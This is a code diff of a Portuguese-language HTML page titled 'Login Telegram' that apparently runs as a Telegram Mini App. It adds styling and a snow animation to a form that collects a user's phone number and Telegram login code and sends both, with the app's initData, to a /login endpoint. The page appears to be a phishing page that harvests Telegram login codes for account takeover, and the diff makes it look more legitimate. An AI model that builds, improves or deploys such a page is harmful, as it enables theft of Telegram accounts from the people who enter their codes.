@@ -1,30 +1,167 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-<meta charset="utf-8">
-<title>Login Telegram</title>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <meta charset="UTF-8">
+  <title>Login Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Telegram Mini App -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #1E1E1E;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      color: #fff;
+    }
+
+    /* ❄️ Animação de neve */
+    .snow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .snow span {
+      position: absolute;
+      top: -10px;
+      width: 6px;
+      height: 6px;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.8;
+      animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+      from {
+        transform: translateY(0);
+      }
+      to {
+        transform: translateY(110vh);
+      }
+    }
+
+    /* 📦 Card */
+    .card {
+      position: relative;
+      z-index: 1;
+      background: #2C2C2C;
+      padding: 24px;
+      width: 100%;
+      max-width: 360px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+    }
+
+    .card h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 20px;
+    }
+
+    .card input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      background: #1E1E1E;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    .card input::placeholder {
+      color: #aaa;
+    }
+
+    .card button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #2F80ED;
+      color: #fff;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .card button:hover {
+      background: #2569c9;
+    }
+  </style>
 </head>
 <body>
-<input id="phone" placeholder="+5534999999999">
-<input id="code" placeholder="Código">
-<button onclick="send()">Enviar</button>
 
-<script>
-const tg = window.Telegram.WebApp
-tg.expand()
+  <!-- ❄️ Neve -->
+  <div class="snow" id="snow"></div>
 
-function send() {
-  fetch("/login", {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({
-      phone: document.getElementById("phone").value,
-      code: document.getElementById("code").value,
-      initData: tg.initData
-    })
-  })
-}
-</script>
+  <!-- 📦 Card -->
+  <div class="card">
+    <h2>Login Telegram</h2>
+
+    <input
+      id="phone"
+      type="text"
+      placeholder="+5534999999999"
+      autocomplete="off"
+    >
+
+    <input
+      id="code"
+      type="text"
+      placeholder="Código"
+      autocomplete="off"
+    >
+
+    <button onclick="send()">Enviar</button>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    function send() {
+      fetch("/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phone: document.getElementById("phone").value.trim(),
+          code: document.getElementById("code").value.trim(),
+          initData: tg.initData
+        })
+      });
+    }
+
+    /* ❄️ Gerar neve */
+    const snow = document.getElementById("snow");
+
+    for (let i = 0; i < 40; i++) {
+      const flake = document.createElement("span");
+      flake.style.left = Math.random() * 100 + "%";
+      flake.style.animationDuration = 5 + Math.random() * 5 + "s";
+      flake.style.opacity = Math.random();
+      flake.style.transform = `scale(${Math.random()})`;
+      snow.appendChild(flake);
+    }
+  </script>
+
 </body>
-</html>
+  </html>
